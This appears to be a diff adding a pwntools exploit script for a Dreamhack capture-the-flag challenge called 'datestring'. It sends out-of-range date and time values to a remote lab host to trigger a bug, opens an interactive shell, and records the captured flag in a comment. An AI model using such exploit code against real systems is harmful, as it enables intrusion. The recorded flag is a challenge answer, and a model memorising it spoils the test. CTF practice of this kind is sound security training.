@@ -1,0 +1,19 @@
+from pwn import *
+
+p = remote("host3.dreamhack.games", 9882)
+'''
+p = gdb.debug("./datestring", gdbscript = 
+b *main + 851
+b *main + 858
+b *main + 830
+)
+'''
+p.sendlineafter(b"Year: ", b"100000907")
+p.sendlineafter(b"Month: ", b"12")
+p.sendlineafter(b"Day: ", b"25")
+p.sendlineafter(b"Hour: ", b"-1")
+p.sendlineafter(b"Minute: ", b"-1")
+p.sendlineafter(b"Second: ", b"-1")
+
+p.interactive()
+#DH{3eead9de6190f0d97857f8fa5a894c71849649e18f9d23777586d9b28d148fc7}
